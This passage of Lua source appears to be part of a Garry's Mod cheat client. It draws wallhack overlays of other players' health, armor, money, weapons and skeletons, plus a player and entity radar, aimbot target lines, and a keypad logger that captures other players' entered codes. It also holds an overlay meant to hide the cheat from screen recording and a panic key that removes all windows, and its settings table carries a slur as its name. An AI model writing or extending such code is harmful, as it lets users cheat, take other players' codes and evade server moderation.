                draw.SimpleText(pm.Name(v) .. " " .. pm.GetUserGroup(v),"]]..b.font18 ..[[",5,allspectators,hacka.colortext)
                allspectators = allspectators + 20
            end
        end
    end
end
if IsValid(hacka.specb) and not gay["MISC_SPECTATORLIST"] or panickey and IsValid(hacka.specb) then
    hacka.specb:Remove()
end


if gay["WH_MIRROR"] and not IsValid(hacka.mirror) then
    hacka.mirror = vgui.Create("DFrame")
    hacka.mirror:SetSize(gay["WH_MIRROR_S_X"], gay["WH_MIRROR_S_Y"])
    hacka.mirror:SetPos(gay["WH_MIRROR_X"], gay["WH_MIRROR_Y"])
    hacka.mirror:SetTitle("")
    hacka.mirror:SetSizable(true)
    hacka.mirror:ShowCloseButton(false)
    hacka.mirror.PerformLayout = function(self, c, d)
        zapic("WH_MIRROR_S_X", c)
        zapic("WH_MIRROR_S_Y", d)
    end
    function hacka.mirror:Paint(w, h)
draw.RoundedBox(0,0,0,w,h,hacka.windowbg)
draw.RoundedBox(0,0,0,w,22,hacka.titlebar)
draw.SimpleText("Mirror","]]..b.menufont..[[",5,2.5,hacka.titletext)
surface.SetDrawColor(hacka.border)
surface.DrawOutlinedRect(0,0,w,h)
        local cw = {}
        local x, y = self:GetPos()
        if gay["WH_MIRROR_TYPE"] == "Type 1" then
            cw.angles = Angle(180, ply:EyeAngles().y, 180)
            cw.origin = ply:GetPos() + Vector(0, 0, 50)
        else
            cw.angles = Angle(90, ply:EyeAngles().y, 0)
            cw.origin = ply:GetPos() + Vector(0, 0, 500)
        end
        cw.x = x + 5
        cw.y = y + 30
        cw.w = w - 10
        cw.h = h - 35
        render.RenderView(cw)
    end
end
if IsValid(hacka.mirror) and not gay["WH_MIRROR"] or panickey and IsValid(hacka.mirror) then
    hacka.mirror:Remove()
end

if gay["WH_RADAR"] and not IsValid(hacka.ac) then
    hacka.ac = vgui.Create("DFrame")
    hacka.ac:SetSize(gay["WH_RADAR_S_X"], gay["WH_RADAR_S_Y"])
    hacka.ac:SetPos(gay["WH_RADAR_X"], gay["WH_RADAR_Y"])
    hacka.ac:SetSizable(true)
    hacka.ac:SetTitle("")
    hacka.ac:SetVisible(true)
    hacka.ac:SetDraggable(true)
    hacka.ac:ShowCloseButton(false)
    hacka.ac.PerformLayout = function(self, c, d)
        zapic("WH_RADAR_S_X", c)
        zapic("WH_RADAR_S_Y", d)
    end
    hacka.ac.PaintOver = function(self, t, u)
draw.RoundedBox(0,0,0,t,u,hacka.windowbg)
        function hacka.ac:OnMousePressed()
            if
                self.m_bSizable and gui.MouseX() > self.x + self:GetWide() - 20 and
                    gui.MouseY() > self.y + self:GetTall() - 20
             then
                self.Sizing = {gui.MouseX() - self:GetWide(), gui.MouseY() - self:GetTall()}
                self:MouseCapture(true)
                return
            end
            if self:GetDraggable() then
                self.Dragging = {gui.MouseX() - self.x, gui.MouseY() - self.y}
                self:MouseCapture(true)
                return
            end
        end
        surface.SetDrawColor(100, 100, 100)
        surface.DrawLine(hacka.ac:GetWide() / 1.94, 25, hacka.ac:GetWide() / 1.94, hacka.ac:GetTall() / 2 + 260)
        surface.DrawLine(hacka.ac:GetWide() / 2 - 250,hacka.ac:GetTall() / 1.94,hacka.ac:GetWide() / 2 + 260,hacka.ac:GetTall() / 1.94)
        for x, p in next, player.GetAll() do
        if gay["WH_DORMANT"] and p:IsDormant()then continue end
            local bz = p:GetPos()
            local bA = ply:GetPos()
            local bB = ply:EyeAngles()
            local bC = hacka.ac:GetWide() / 2 + (bz.x - bA.x) / gay["WH_RADAR_DISTANCE"]
            local bD = hacka.ac:GetTall() / 2 + (bA.y - bz.y) / gay["WH_RADAR_DISTANCE"]
            local bE = bB.y - 90
            bE = math.rad(bE)
            bC = bC - hacka.ac:GetWide() / 2
            bD = bD - hacka.ac:GetTall() / 2
            local bF = bC * math.cos(bE) - bD * math.sin(bE)
            local bG = bC * math.sin(bE) + bD * math.cos(bE)
            bF = bF + hacka.ac:GetWide() / 2
            bG = bG + hacka.ac:GetTall() / 2
            local sizee = gay["WH_RADAR_SIZE"]
            if p ~= ply then
                draw.RoundedBox(1, bF-sizee/2, bG-sizee/2, sizee, sizee, team.GetColor(p:Team()))
                if gay["RDRSNA"] then
surface.SetFont("]]..b.font14 ..[[")
local tw, th = surface.GetTextSize(p:Name())
draw.SimpleText(p:Name(), "]]..b.font14 ..[[", bF - (tw / 2), bG - 2 -sizee/2 , hacka.colortext)
end
            end
        end
        for _, p in next, ents.FindByClass("*") do
            if gay["ENTITYLIST"][p:GetClass()] then
            if gay["WH_ENTITY_DORMANT"] and p:IsDormant()then continue end
                if p:GetPos():Distance(ply:GetPos()) < gay["WH_ENTITY_DISTANCE"] then
                    local bz = p:GetPos()
                    local bA = ply:GetPos()
                    local bB = ply:EyeAngles()
                    local bC = hacka.ac:GetWide() / 2 + (bz.x - bA.x) / 20
                    local bD = hacka.ac:GetTall() / 2 + (bA.y - bz.y) / 20
                    local bE = bB.y - 90
                    bE = math.rad(bE)
                    bC = bC - hacka.ac:GetWide() / 2
                    bD = bD - hacka.ac:GetTall() / 2
                    local bF = bC * math.cos(bE) - bD * math.sin(bE)
                    local bG = bC * math.sin(bE) + bD * math.cos(bE)
                    bF = bF + hacka.ac:GetWide() / 2
                    bG = bG + hacka.ac:GetTall() / 2
                    local sizee = gay["WH_RADAR_SIZE"]
                    draw.RoundedBox(1, bF-sizee/2, bG-sizee/2, sizee, sizee, Color(255, 0, 0))
                end
            end
        end

draw.RoundedBox(0,0,0,t,22,hacka.titlebar)
draw.SimpleText("Radar","]]..b.menufont..[[",5,2.5,hacka.titletext)
surface.SetDrawColor(hacka.border)
surface.DrawOutlinedRect(0,0,t,u)

    end
end
if IsValid(hacka.ac) and not gay["WH_RADAR"] or panickey and IsValid(hacka.ac) then
    hacka.ac:Remove()
end

if gay["WH_INFO"] and not IsValid(hacka.info) then
    hacka.info = vgui.Create("DFrame")
    hacka.info:SetSize(gay["WH_INFO_S_X"], gay["WH_INFO_S_Y"])
    hacka.info:SetPos(gay["WH_INFO_X"], gay["WH_INFO_Y"])
    hacka.info:SetTitle("")
    hacka.info:SetSizable(true)
    hacka.info:ShowCloseButton(false)
    hacka.info.PerformLayout = function(self, c, d)
        zapic("WH_INFO_S_X", c)
        zapic("WH_INFO_S_Y", d)
    end
    function hacka.info:Paint(w, h)
draw.RoundedBox(0,0,0,w,h,hacka.windowbg)
draw.RoundedBox(0,0,0,w,22,hacka.titlebar)
draw.SimpleText("Info","]]..b.menufont..[[",5,2.5,hacka.titletext)
surface.SetDrawColor(hacka.border)
surface.DrawOutlinedRect(0,0,w,h)
        draw.SimpleText("Health: " .. ply:Health(),"]]..b.menufont..[[",2.5,25,hacka.colortext)
        draw.SimpleText("Armor: " .. ply:Armor(),"]]..b.menufont..[[",2.5,25 + 15,hacka.colortext)
        draw.SimpleText("Velocity: " .. math.Round(ply:GetVelocity():Length()),"]]..b.menufont..[[",2.5,25 + 15 + 15,hacka.colortext)
        draw.SimpleText("Server: " .. GetHostName(),"]]..b.menufont..[[",2.5,70,hacka.colortext)
draw.SimpleText("Online: " .. #player.GetAll(),"]]..b.menufont..[[",2.5,85,hacka.colortext)
        draw.SimpleText("Map: " .. game.GetMap(),"]]..b.menufont..[[",2.5,100,hacka.colortext)
        draw.SimpleText("Entities: " .. math.Round(ents.GetCount() - player.GetCount() * 12),"]]..b.menufont..[[",2.5,115,hacka.colortext)
        draw.SimpleText("Frames: " .. math.Round(1 / FrameTime()),"]]..b.menufont..[[",2.5,130,hacka.colortext)
        draw.SimpleText("Ping: " .. ply:Ping(),"]]..b.menufont..[[",2.5,145,hacka.colortext)
        draw.SimpleText("Date: " .. os.date("%d %b %Y"),"]]..b.menufont..[[",2.5,160,hacka.colortext)
        draw.SimpleText("Time: " .. os.date("%H:%M:%S"),"]]..b.menufont..[[",2.5,175,hacka.colortext)
        draw.SimpleText("Tickrate: " .. math.Round(1 / engine.TickInterval()),"]]..b.menufont..[[",2.5,190,hacka.colortext)
        draw.SimpleText("Gamemode: " .. engine.ActiveGamemode(),"]]..b.menufont..[[",2.5,190 + 15,hacka.colortext)
        if aimtarget and em.IsValid(aimtarget) and aimtarget:IsPlayer() then
            draw.SimpleText("Target Aim: "..aimtarget:Name(),"]]..b.menufont..[[",2.5,190 + 15 + 15,hacka.colortext)
        else
draw.SimpleText("Target Aim: None","]]..b.menufont..[[",2.5,190 + 15 + 15,hacka.colortext)
end
local weaons=ply:GetActiveWeapon()
if IsValid(weaons) then
            draw.SimpleText("Clip: " ..weaons:Clip1() .."/" .. ply:GetAmmoCount(weaons:GetPrimaryAmmoType()),"]]..b.menufont..[[",2.5,190 + 15 + 15 + 15,hacka.colortext)
        end
    end
end
if IsValid(hacka.info) and not gay["WH_INFO"] or panickey and IsValid(hacka.info) then
    hacka.info:Remove()
end
if gay["OBSBYPASS"] and not IsValid(hacka.obs) then
    hacka.obs = vgui.Create("DFrame")
    hacka.obs:SetSize(ScrW(),ScrH())
    hacka.obs:SetPos(0,0)
    hacka.obs:SetTitle("")
hacka.obs:SetDraggable(false)
hacka.obs:ShowCloseButton(false)
    hacka.obs.Paint=hacka.esp
end
if IsValid(hacka.obs) and not gay["OBSBYPASS"] or panickey and IsValid(hacka.obs) then
    hacka.obs:Remove()
end
end
timercheck()
timer.Create("]]..b.timer..[[",2,0,timercheck)
end)

local a=GetRenderTarget("AntiSG"..os.time(),ScrW(),ScrH())
hook.Add("ShutDown","]]..b.hooks["ShutDown"]..[[",function()
if gay["MISC_SPECTATORLIST"]and IsValid(hacka.specb) then
local pos,otsos=hacka.specb:GetPos()
if IsValid(hacka.specb)then
zapic("MISC_SPECTATORLIST_X",pos)
zapic("MISC_SPECTATORLIST_Y",otsos)
end
end
if gay["WH_MIRROR"]and IsValid(hacka.mirror) then
local pos,otsos=hacka.mirror:GetPos()
zapic("WH_MIRROR_X",pos)
zapic("WH_MIRROR_Y",otsos)
end
if gay["WH_RADAR"]and IsValid(hacka.ac) then
local pos,otsos=hacka.ac:GetPos()
zapic("WH_RADAR_X",pos)
zapic("WH_RADAR_Y",otsos)
end
if gay["WH_INFO"]and IsValid(hacka.info) then
local pos,otsos=hacka.info:GetPos()
zapic("WH_INFO_X",pos)
zapic("WH_INFO_Y",otsos)
end
if gay["MISC_ADMINLIST"]and IsValid(hacka.adminlist) then
local pos,otsos=hacka.adminlist:GetPos()
zapic("MISC_ADMINLIST_X",pos)
zapic("MISC_ADMINLIST_Y",otsos)
end
if not gay["OBSBYPASS"]then return end
render.SetRenderTarget()
end)

local function buttoncheckbind(a)
local ply=LocalPlayer()
if a==0 then return end
    if pm.IsTyping(ply) then
        return false
    end
    if input.IsKeyDown(a or 87) or input.IsMouseDown(a or 87) then
        return true
    end
    return false
end

local function box2d(b)
    local c, d = b:OBBMins(), b:OBBMaxs()
    local e = {
        Vector(c.x, c.y, c.z),
        Vector(c.x, c.y, d.z),
        Vector(c.x, d.y, c.z),
        Vector(c.x, d.y, d.z),
        Vector(d.x, c.y, c.z),
        Vector(d.x, c.y, d.z),
        Vector(d.x, d.y, c.z),
        Vector(d.x, d.y, d.z)
    }
    local f, g, h, i = ScrW() * 2, ScrH() * 2, 0, 0
    for j, k in next, e do
        local l = b:LocalToWorld(k):ToScreen()
        f, g = math.min(f, l.x), math.min(g, l.y)
        h, i = math.max(h, l.x), math.max(i, l.y)
    end
    return f, g, h, i
end

function hacka.onitify(a)
if panickey then return end
if IsValid(hacka.rt)or hacka.rt then hacka.rt:Hide()hacka.rt=nil end
surface.SetFont("]]..b.font22 ..[[")
local b=select(1,surface.GetTextSize(a))+10
hacka.rt=vgui.Create("DPanel")
hacka.rt:SetSize(b,38-6)
hacka.rt:SetPos(-b,10)
hacka.rt.Paint=function(self,c,d)
draw.RoundedBox(0,0,0,c,d,hacka.windowbg)
draw.SimpleText(a,"]]..b.font22 ..[[",5,3,hacka.colortext)
surface.SetDrawColor(hacka.border)
surface.DrawOutlinedRect(0,0,c,d)
end
hacka.rt:MoveTo(10,10,.2,0,-1,function()
timer.Simple(gay["NOIFICATION_SPEED"],function()
hacka.rt:MoveTo(-b,10,.2,0,-1)
end)
end)
end


hook.Add("PreDrawViewModel","]]..b.hooks["PreDrawViewModel"]..[[",function(vm)
if panickey then return end
if panic then return end
    if gay["WH_VMCHAMS"] then
if not vm then return end
render.SetLightingMode(2)
for k, v in next, vm:GetMaterials() do
if v:find("v_hands") then
render.MaterialOverrideByIndex(k - 1, chamsweaponmaterial2)
render.SetColorModulation(gay["WH_VMCHAMS_COLOR"]["r"] / 255,gay["WH_VMCHAMS_COLOR"]["g"] / 255,gay["WH_VMCHAMS_COLOR"]["b"] / 255)
else
render.MaterialOverrideByIndex(k - 1, chamsweaponmaterial)
render.SetColorModulation(gay["WH_VMCHAMS_COLOR"]["r"] / 255,gay["WH_VMCHAMS_COLOR"]["g"] / 255,gay["WH_VMCHAMS_COLOR"]["b"] / 255)
end
end
end
end)


hook.Add("PostDrawViewModel","]]..b.hooks["PostDrawViewModel"]..[[",function(vm)
if panickey then return end
if panic then return end
if gay["WH_FULLBRIGHT"] then
render.SetLightingMode(0)
    end
    if gay["WH_VMCHAMS"] then
if not vm then return end
render.SetLightingMode(0)
        for k, v in next, vm:GetMaterials() do
            render.MaterialOverrideByIndex(k - 1, nil)
        end
end
end)

local function checknamesinfuck(p)
local b=""
if p.Getamount then b=b.."("..p:Getamount()..")"end
--if p.GetInk then b=b.."("..p:GetInk()..")"end
if p.GetHP then b=b.."("..p:GetHP()..")"end
--if p.GetLastPrint then b=b.."("..p:GetLastPrint()..")"end
if p.Getowning_ent then if IsValid(p:Getowning_ent())then b=b.."("..p:Getowning_ent():Name()..")"end end
--if p.Getcount then b=b.."("..p:Getcount()..")"end
--if p.Getcontents then b=b.."("..p:Getcontents()..")"end
--if p.PrintName then b=b.."("..p.PrintName..")"end
if p.GetMoney then b=b.."($"..p:GetMoney()..")"end
--if p.GetPTemp then b=b.."("..p:GetPTemp().."°C)"end
--if p.GetUpgradelvl then b=b.."("..p:GetUpgradelvl()..")"end
--if p.GetActivator then b=b.."("..p:GetActivator()..")"end
if p.PrintedMoney then b=b.."("..p.PrintedMoney..")"end
--if p.Battery then b=b.."("..p.Battery.."%)"end

return b
end

local function CornerBox(x, y, w, h)
    local bWidth = w
    local bHeight = h
    surface.DrawLine(x, y, x, y + (bHeight / 5))
    surface.DrawLine(x, y, x + (bWidth / 5), y)
    surface.DrawLine(x + bWidth, y, x + bWidth - (bWidth / 5), y)
    surface.DrawLine(x + bWidth, y, x + bWidth, y + (bHeight / 5))
    surface.DrawLine(x, y + bHeight, x + (bWidth / 5), y + bHeight)
    surface.DrawLine(x, y + bHeight, x, y + bHeight - (bHeight / 5))
    surface.DrawLine(x + bWidth, y + bHeight, x + bWidth - (bWidth / 5), y + bHeight)
    surface.DrawLine(x + bWidth, y + bHeight, x + bWidth, y + bHeight - (bHeight / 5))
end

function hacka.esp()

if panickey then return end
if panic then return end
local ply=LocalPlayer()
xpcall(function()

if gay["AIM_DRAWFOV"] and gay["AIM_ENABLED"] then
    surface.DrawCircle(ScrW() / 2, ScrH() / 2, gay["AIM_FOV"] * 4, gay["WH_FOV_COLOR"])
end


if gay["WH_CURSORENTITYNAME"]then
local ent=ply:GetEyeTrace().Entity:GetClass()
local ents=ply:GetEyeTrace().Entity
if ent!="worldspawn"then
local tw, th = surface.GetTextSize(ent)
draw.SimpleText(ent, "ChatFont", ents:LocalToWorld(ents:OBBCenter()):ToScreen().x - tw / 2,ents:LocalToWorld(ents:OBBCenter()):ToScreen().y - th / 2 , gay["WH_CURSORENTITYNAME_COLOR"] )
end
end

if gay["WH_SNAPLINE"] then
    if aimtarget and em.IsValid(aimtarget) then
        local pos = vm.ToScreen(em.LocalToWorld(aimtarget, em.OBBCenter(aimtarget)))
        surface.SetDrawColor(gay["WH_SNAPLINE_COLOR"])
        surface.DrawLine(ScrW() / 2, ScrH() / 2, pos.x, pos.y)
    end
end

if gay["CROSSHAIR_ENABLED"]then
   local A=ScrH()/2
   local z=ScrW()/2
   local Z=gay["CROSSHAIR_SIZE"]
   if gay["CROSSHAIR_FOV"]then
if Z>4 then
draw.RoundedBox(99,z-Z/2,A-Z/2,Z,Z,gay["CROSSHAIR_COLOR"])
end
   end
   if gay["CROSSHAIR_CROSSHAIR"]then
      surface.SetDrawColor(gay["CROSSHAIR_COLOR"])
      surface.DrawLine(z+Z,A,z-Z,A)
      surface.DrawLine(z,A+Z,z,A-Z)
   end
   if gay["CROSSHAIR_BOX"]then
      surface.SetDrawColor(gay["CROSSHAIR_COLOR"])
      surface.DrawOutlinedRect(z-Z-2,A-Z-2,(Z+2)*2+1,(Z+2)*2+1)
   end
end

if gay["MISC_KEYPADLOGGER"] then
for b, q in next, ents.FindByClass("Keypad") do
        if q:GetStatus() == 1 then
            if gay["KEYPADTYPE"] == 1 then
local kl = q:GetText()
if kl=="****" or kl=="***" or kl=="**" or kl=="*" then continue end
hacka.keypadlogger[q] = kl
else
                local kl = q:GetDisplayText()
if kl=="****" or kl=="***" or kl=="**" or kl=="*" then continue end
hacka.keypadlogger[q] = kl
            end
        end
        if hacka.keypadlogger[q] then
        if q:GetPos():Distance(ply:GetPos()) < gay["MISC_KEYPADLOGGER_DISTANCE"] then
        surface.SetFont(hacka.fontentitysg)
local tw, th = surface.GetTextSize(hacka.keypadlogger[q])
surface.SetTextColor(gay["MISC_KEYPADLOGGER_COLOR"]);
surface.SetTextPos(q:LocalToWorld(q:OBBCenter()):ToScreen().x-tw/2,q:LocalToWorld(q:OBBCenter()):ToScreen().y-th/2);
surface.DrawText(hacka.keypadlogger[q]);
        end
        end
    end
end

for k, v in next, player.GetAll() do
    if v~=ply and vm.Distance( em.GetPos(v), em.GetPos(ply) ) < gay["WH_DISTANCE"] then
        if gay["WH_DORMANT"] and v:IsDormant()then continue end
        if IsValid(v) and v:Alive() then
            local pos = em.GetPos(v);
            local pos, pos2 = vm.ToScreen(pos - Vector(0, 0, 5)), vm.ToScreen(pos + Vector(0, 0, 70))
            local h = pos.y - pos2.y
            local w = h / 2.2
            local esp_up = 7
            local esp_down = 7
local esp_right = 0
local esp_left = 0
local isfriend=gay["FRIENDLIST"][v:SteamID()]

            surface.SetFont(hacka.fontplayersg)

            if gay["WH_HEALTH"] then
local function healthbar()
                    local hp = v:Health() * h / 100
                    if hp > h then
                        hp = h
                    end
                    local diff = h - hp
                   if gay["WH_HEALTH_POSITION"] == 1 then
surface.SetDrawColor(0, 0, 0, 255);
surface.DrawRect(pos.x - w / 2 + 1, pos.y - h - 1, w + 2, 3);
surface.SetDrawColor( ( 100 - em.Health(v) ) * 2.55, em.Health(v) * 2.55, 0, 255);
surface.DrawRect(pos.x - w / 2 + 2, pos.y - h , hp/2.2, 1);
                   elseif gay["WH_HEALTH_POSITION"] == 2 then
surface.SetDrawColor(0, 0, 0, 255);
surface.DrawRect(pos.x - w / 2 + 1, pos.y, w + 2, 3);
surface.SetDrawColor( ( 100 - em.Health(v) ) * 2.55, em.Health(v) * 2.55, 0, 255);
surface.DrawRect(pos.x - w / 2 + 2, pos.y +1 , hp/2.2, 1);
                   elseif gay["WH_HEALTH_POSITION"] == 3 then
surface.SetDrawColor(0, 0, 0)
                        surface.DrawRect(pos.x + w / 2 - 5 + 5, pos.y - h - 1, 3, h + 2)
surface.SetDrawColor((100 - v:Health()) * 2.55, v:Health() * 2.55, 0, 255)
                        surface.DrawRect(pos.x + w / 2 - 4 + 5, pos.y - h + diff, 1, hp)
elseif gay["WH_HEALTH_POSITION"] == 4 then
                        surface.SetDrawColor(0, 0, 0)
                        surface.DrawRect(pos.x - w / 2 - 5, pos.y - h - 1, 3, h + 2)
surface.SetDrawColor((100 - v:Health()) * 2.55, v:Health() * 2.55, 0, 255)
                        surface.DrawRect(pos.x - w / 2 - 4, pos.y - h + diff, 1, hp)
end
            end
            local function showhealth()
local text = v:Health()
local color=Color((100 - v:Health()) * 2.55, v:Health() * 2.55, 0)
local tw, th = surface.GetTextSize(text)
if gay["WH_HEALTH_POSITION"] == 1 then
surface.SetTextPos(pos.x-tw/2,pos.y-h+2-th-esp_up);
esp_up = esp_up  + th
elseif gay["WH_HEALTH_POSITION"] == 2 then
surface.SetTextPos(pos.x-tw/2,pos.y-th/2+5+esp_down);
esp_down = esp_down  + th
elseif gay["WH_HEALTH_POSITION"] == 3 then
surface.SetTextPos(pos.x+w/2+10,pos.y-h+esp_right);
esp_right = esp_right  + th
elseif gay["WH_HEALTH_POSITION"] == 4 then
surface.SetTextPos(pos.x-w/2-tw-10,pos.y-h+esp_left);
esp_left = esp_left  + th
end
surface.SetTextColor(color);
surface.DrawText(text);
            end
                if gay["WH_HEALTH_TYPETYPE"] == "Text + Bar" then
                showhealth(v)
                healthbar(v)
                elseif gay["WH_HEALTH_TYPETYPE"] == "Text" then
 showhealth(v)
                elseif gay["WH_HEALTH_TYPETYPE"] == "Bar" then
                healthbar(v)
         end
         end

            if gay["WH_ARMOR"] then
                if gay["WH_ARMOR_TYPETYPE"] == "Text + Bar" then

local text = v:Armor()
local tw, th = surface.GetTextSize(text)
if gay["WH_ARMOR_POSITION"] == 1 then
surface.SetTextPos(pos.x-tw/2,pos.y-h+2-th-esp_up);
esp_up = esp_up  + th
elseif gay["WH_ARMOR_POSITION"] == 2 then
surface.SetTextPos(pos.x-tw/2,pos.y-th/2+5+esp_down);
esp_down = esp_down  + th
elseif gay["WH_ARMOR_POSITION"] == 3 then
surface.SetTextPos(pos.x+w/2+10,pos.y-h+esp_right);
esp_right = esp_right  + th
elseif gay["WH_ARMOR_POSITION"] == 4 then
surface.SetTextPos(pos.x-w/2-tw-10,pos.y-h+esp_left);
esp_left = esp_left  + th
end
surface.SetTextColor(0,0,255);
surface.DrawText(text);

                    if gay["WH_ARMOR_POSITION"] == 4 then
                        local hp = v:Armor() * h / 100
                        if hp > h then
                            hp = h
                        end
                        local diff = h - hp
                        surface.SetDrawColor(Color(0,0,255))
                        surface.DrawRect(pos.x - w / 2, pos.y - h + diff, 1, hp)
                    else
                        local hp = v:Armor() * h / 100
                        if hp > h then
                            hp = h
                        end
                        local diff = h - hp
                        surface.SetDrawColor(Color(0,0,255))
                        surface.DrawRect(pos.x + w / 2 + 10, pos.y - h + diff, 1, hp)
                    end

                elseif gay["WH_ARMOR_TYPETYPE"] == "Text" then
local text = v:Armor()
local tw, th = surface.GetTextSize(text)
if gay["WH_ARMOR_POSITION"] == 1 then
surface.SetTextPos(pos.x-tw/2,pos.y-h+2-th-esp_up);
esp_up = esp_up  + th
elseif gay["WH_ARMOR_POSITION"] == 2 then
surface.SetTextPos(pos.x-tw/2,pos.y-th/2+5+esp_down);
esp_down = esp_down  + th
elseif gay["WH_ARMOR_POSITION"] == 3 then
surface.SetTextPos(pos.x+w/2+10,pos.y-h+esp_right);
esp_right = esp_right  + th
elseif gay["WH_ARMOR_POSITION"] == 4 then
surface.SetTextPos(pos.x-w/2-tw-10,pos.y-h+esp_left);
esp_left = esp_left  + th
end
surface.SetTextColor(Color(0,0,255));
surface.DrawText(text);
                else
                    if gay["WH_ARMOR_POSITION"] == 4 then
                        local hp = v:Armor() * h / 100
                        if hp > h then
                            hp = h
                        end
                        local diff = h - hp
                        surface.SetDrawColor(0, 0, 0, 255)
                        surface.DrawRect(pos.x - w / 2 - 1, pos.y - h - 1, 3, h + 2)
                        surface.SetDrawColor(Color(0,0,255))
                        surface.DrawRect(pos.x - w / 2, pos.y - h + diff, 1, hp)
                    else
                        local hp = v:Armor() * h / 100
                        if hp > h then
                            hp = h
                        end
                        local diff = h - hp
                        surface.SetDrawColor(0, 0, 0, 255)
                        surface.DrawRect(pos.x + w / 2 - 5 + 10, pos.y - h - 1, 3, h + 2)
                        surface.SetDrawColor(Color(0,0,255))
                        surface.DrawRect(pos.x + w / 2 - 4 + 10, pos.y - h + diff, 1, hp)
                    end
                end
            end

            if gay["WH_JOB"] then
local text = team.GetName(v:Team())
local tw, th = surface.GetTextSize(text)
if gay["WH_JOB_POSITION"] == 1 then
surface.SetTextPos(pos.x-tw/2,pos.y-h+2-th-esp_up);
esp_up = esp_up  + th
elseif gay["WH_JOB_POSITION"] == 2 then
surface.SetTextPos(pos.x-tw/2,pos.y-th/2+5+esp_down);
esp_down = esp_down  + th
elseif gay["WH_JOB_POSITION"] == 3 then
surface.SetTextPos(pos.x+w/2+10,pos.y-h+esp_right);
esp_right = esp_right  + th
elseif gay["WH_JOB_POSITION"] == 4 then
surface.SetTextPos(pos.x-w/2-tw-10,pos.y-h+esp_left);
esp_left = esp_left  + th
end
surface.SetTextColor(team.GetColor(v:Team()));
surface.DrawText(text);
            end

            if gay["WH_MONEY"] and DarkRP then
local text = DarkRP.formatMoney(v:getDarkRPVar("money"))
local tw, th = surface.GetTextSize(text)
if gay["WH_MONEY_POSITION"] == 1 then
surface.SetTextPos(pos.x-tw/2,pos.y-h+2-th-esp_up);
esp_up = esp_up  + th
elseif gay["WH_MONEY_POSITION"] == 2 then
surface.SetTextPos(pos.x-tw/2,pos.y-th/2+5+esp_down);
esp_down = esp_down  + th
elseif gay["WH_MONEY_POSITION"] == 3 then
surface.SetTextPos(pos.x+w/2+10,pos.y-h+esp_right);
esp_right = esp_right  + th
elseif gay["WH_MONEY_POSITION"] == 4 then
surface.SetTextPos(pos.x-w/2-tw-10,pos.y-h+esp_left);
esp_left = esp_left  + th
end
surface.SetTextColor(gay["WH_MONEY_COLOR"]);
surface.DrawText(text);
            end

            if gay["WH_WEAPON"] then
local weaponnn = v:GetActiveWeapon();
                if gay["WH_WEAPON_TYPETYPE"] == "All" then
                    for _, v in next, v:GetWeapons() do                   
local tw, th = surface.GetTextSize(v:GetPrintName())
if gay["WH_WEAPON_POSITION"] == 1 then
surface.SetTextPos(pos.x-tw/2,pos.y-h+2-th-esp_up);
esp_up = esp_up  + th
elseif gay["WH_WEAPON_POSITION"] == 2 then
surface.SetTextPos(pos.x-tw/2,pos.y-th/2+5+esp_down);
esp_down = esp_down  + th
elseif gay["WH_WEAPON_POSITION"] == 3 then
surface.SetTextPos(pos.x+w/2+10,pos.y-h+esp_right);
esp_right = esp_right  + th
elseif gay["WH_WEAPON_POSITION"] == 4 then
surface.SetTextPos(pos.x-w/2-tw-10,pos.y-h+esp_left);
esp_left = esp_left  + th
end
surface.SetTextColor(gay["WH_WEAPON_COLOR"]);
surface.DrawText(v:GetPrintName());
end
                elseif weaponnn and IsValid(weaponnn)then
                local clipweaponf=weaponnn:Clip1()
                local weaponnames = (gay["WH_WEAPON_SHOWCLIP"]and clipweaponf~=-1)and weaponnn:GetPrintName().."("..clipweaponf.."/" .. v:GetAmmoCount(weaponnn:GetPrimaryAmmoType())..")" or weaponnn:GetPrintName()
local tw, th = surface.GetTextSize(weaponnames)
if gay["WH_WEAPON_POSITION"] == 1 then
surface.SetTextPos(pos.x-tw/2,pos.y-h+2-th-esp_up);
esp_up = esp_up  + th
elseif gay["WH_WEAPON_POSITION"] == 2 then
surface.SetTextPos(pos.x-tw/2,pos.y-th/2+5+esp_down);
esp_down = esp_down  + th
elseif gay["WH_WEAPON_POSITION"] == 3 then
surface.SetTextPos(pos.x+w/2+10,pos.y-h+esp_right);
esp_right = esp_right  + th
elseif gay["WH_WEAPON_POSITION"] == 4 then
surface.SetTextPos(pos.x-w/2-tw-10,pos.y-h+esp_left);
esp_left = esp_left  + th
end
surface.SetTextColor(gay["WH_WEAPON_COLOR"]);
surface.DrawText(weaponnames);
                end
            end

            if gay["WH_USERGROUP"] then           
local tw, th = surface.GetTextSize(pm.GetUserGroup(v))
    if gay["WH_USERGROUP_POSITION"] == 1 then
surface.SetTextPos(pos.x-tw/2,pos.y-h+2-th-esp_up);
                    esp_up = esp_up  + th
                elseif gay["WH_USERGROUP_POSITION"] == 2 then
surface.SetTextPos(pos.x-tw/2,pos.y-th/2+5+esp_down);
                    esp_down = esp_down  + th
                elseif gay["WH_USERGROUP_POSITION"] == 3 then
surface.SetTextPos(pos.x+w/2+10,pos.y-h+esp_right);
                    esp_right = esp_right  + th
                elseif gay["WH_USERGROUP_POSITION"] == 4 then
surface.SetTextPos(pos.x-w/2-tw-10,pos.y-h+esp_left);
                    esp_left = esp_left  + th
                end
surface.SetTextColor(gay["WH_USERGROUP_COLOR"]);
surface.DrawText(pm.GetUserGroup(v));
end
            if gay["WH_NAME"] then
local tw, th = surface.GetTextSize(pm.Name(v))
    if gay["WH_NAME_POSITION"] == 1 then
surface.SetTextPos(pos.x-tw/2,pos.y-h+2-th-esp_up);
                    esp_up = esp_up  + th
                elseif gay["WH_NAME_POSITION"] == 2 then
surface.SetTextPos(pos.x-tw/2,pos.y-th/2+5+esp_down);
                    esp_down = esp_down  + th
                elseif gay["WH_NAME_POSITION"] == 3 then
surface.SetTextPos(pos.x+w/2+10,pos.y-h+esp_right);
                    esp_right = esp_right  + th
                elseif gay["WH_NAME_POSITION"] == 4 then
surface.SetTextPos(pos.x-w/2-tw-10,pos.y-h+esp_left);
                    esp_left = esp_left  + th
                end
surface.SetTextColor((gay["WH_NAME_FRIENDCOLOR"] and isfriend)and gay["WH_FRIENDCOLOR"] or gay["WH_NAME_COLOR"]);
surface.DrawText(pm.Name(v));
            end
            if gay["WH_SKELETON"] then
local origin = em.GetPos(v);
for i = 1, em.GetBoneCount(v) do
local parent = em.GetBoneParent(v, i);
if(!parent) then continue; end
local bonepos, parentpos = em.GetBonePosition(v, i), em.GetBonePosition(v, parent);
if(!bonepos || !parentpos || bonepos == origin) then continue; end
local bs, ps = vm.ToScreen(bonepos), vm.ToScreen(parentpos);
if gay["WH_SKELETON_COLORTYPE"] == "Team" then
surface.SetDrawColor(team.GetColor(v:Team()))
else
